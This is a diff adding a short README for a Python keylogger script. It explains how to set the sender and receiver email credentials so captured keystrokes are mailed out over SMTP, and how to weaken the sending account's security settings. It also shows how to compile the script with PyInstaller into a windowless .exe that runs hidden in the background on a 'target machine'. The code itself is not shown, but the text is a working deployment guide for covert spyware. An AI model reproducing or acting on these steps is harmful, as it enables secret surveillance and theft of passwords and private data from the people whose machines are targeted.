@@ -1,0 +1,16 @@
+# Run the command pip install pynput
+# Open the "key.py" and in line 34(smtp.login()) give the mail and password from which you want to send the mail
+# In line 40(smtp.sendmail(1,2,msg)) first give the sender's address then give the recevier mail's address
+
+ * Note: Make sure 2-step verification is turned off for your "senders mail" and go to "myaccount.google.com/lesssecureapps"
+            and make sure this is also turned off
+
+
+  ***** To make a executable file(exe) to run in a windows machine***** 
+* To make a .exe file, Install pyinstaller by using the command "pip3 install pyinstaller"
+* Navigate your working directory to the in which the python script contains 
+* Type the command "pyinstaller --onefile --noconsole filename.py " in that directory
+* Then a folder named "dist" will be created
+* Open the dist folder
+* Run the ".exe" file in your target machine and it will start running in the background
+
